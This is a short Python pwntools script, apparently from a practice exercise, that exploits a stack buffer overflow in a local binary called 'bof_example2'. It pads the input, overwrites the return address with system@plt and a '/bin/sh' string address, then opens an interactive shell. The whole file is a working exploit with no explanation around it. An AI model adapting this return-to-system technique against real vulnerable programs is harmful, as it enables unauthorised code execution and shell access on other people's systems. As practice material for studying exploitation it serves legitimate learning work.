from pwn import *
r = process('./bof_example2')

system_plt = 0x08048340
binsh = 0x804a024
payload = '1' * (0x18  + 4) + p32(system_plt) + 'AAAA' + p32(binsh)
r.sendline(payload)
r.interactive()
